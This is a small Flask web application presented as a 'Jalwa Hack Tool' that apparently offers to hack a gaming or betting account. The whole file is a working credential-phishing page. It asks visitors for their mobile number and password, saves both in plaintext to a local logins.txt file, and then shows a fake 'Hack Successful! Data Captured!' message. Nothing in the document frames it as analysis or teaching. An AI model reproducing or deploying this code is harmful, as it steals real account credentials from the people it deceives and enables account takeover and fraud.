from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <html>
    <head>
        <title>Jalwa Hack Login 🔥</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                margin: 0;
                padding: 0;
                height: 100vh;
                width: 100%;
                background: linear-gradient(135deg, #000000, #0f0f0f);
                color: #39ff14;
                font-family: monospace;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .container {
                text-align: center;
                background: rgba(0, 255, 0, 0.05);
                padding: 25px;
                border-radius: 15px;
                box-shadow: 0 0 25px #39ff14, 0 0 40px #ff0080;
                width: 90%;
                max-width: 400px;
            }
            h1 {
                color: #00ff00;
                text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 40px #0ff;
                font-size: 30px;
                margin-bottom: 10px;
            }
            h3 {
                color: #ff0080;
                text-shadow: 0 0 5px #ff0080, 0 0 10px #ff0080;
                font-size: 20px;
                margin-top: 0;
            }
            input[type="text"], input[type="password"] {
                width: 90%;
                padding: 12px;
                margin: 10px 0;
                background-color: #000;
                color: #39ff14;
                border: 2px solid #ff0080;
                border-radius: 8px;
                font-size: 18px;
                box-shadow: 0 0 10px #ff0080;
            }
            input[type="submit"] {
                width: 95%;
                padding: 12px;
                font-size: 20px;
                color: #000;
                background: linear-gradient(45deg, #39ff14, #00ffff);
                border: none;
                border-radius: 8px;
                cursor: pointer;
                box-shadow: 0 0 10px #00ffff, 0 0 20px #39ff14;
            }
            input[type="submit"]:hover {
                background: linear-gradient(45deg, #ff0080, #ff0000);
                box-shadow: 0 0 20px #ff0080, 0 0 30px #ff0000;
                color: #fff;
            }
            p {
                color: #ffff00;
                font-size: 16px;
                text-shadow: 0 0 5px #ffff00;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔥 JALWA HACK TOOL ULTIMATE 🔥</h1>
            <h3>H A C K   N U M B E R   F O U N D !</h3>
            <form action="/submit" method="post">
                <input type="text" name="number" placeholder="Enter Mobile Number"><br>
                <input type="password" name="password" placeholder="Enter Password"><br>
                <input type="submit" value="💣 Hack Now 💣">
            </form>
            <p>Use this number to sign up and activate hack - Jalwa Mode ON!</p>
        </div>
    </body>
    </html>
    '''

@app.route('/submit', methods=['POST'])
def submit():
    number = request.form.get('number')
    password = request.form.get('password')
    with open("logins.txt", "a") as f:
        f.write(f"Number: {number}, Password: {password}\n")
    return '''
    <html>
    <head>
        <title>Hack Success</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                background: linear-gradient(135deg, #000000, #0f0f0f);
                color: #00ff00;
                text-align: center;
                font-family: monospace;
                padding-top: 100px;
            }
            h2 {
                color: #00ff00;
                text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
            }
            a {
                color: #39ff14;
                font-size: 20px;
                text-shadow: 0 0 5px #39ff14;
            }
        </style>
    </head>
    <body>
        <h2>✅ Hack Successful! Data Captured!</h2>
        <a href="/">Back to Hack</a>
    </body>
    </html>
    '''

if __name__ == "__main__":
    app.run()
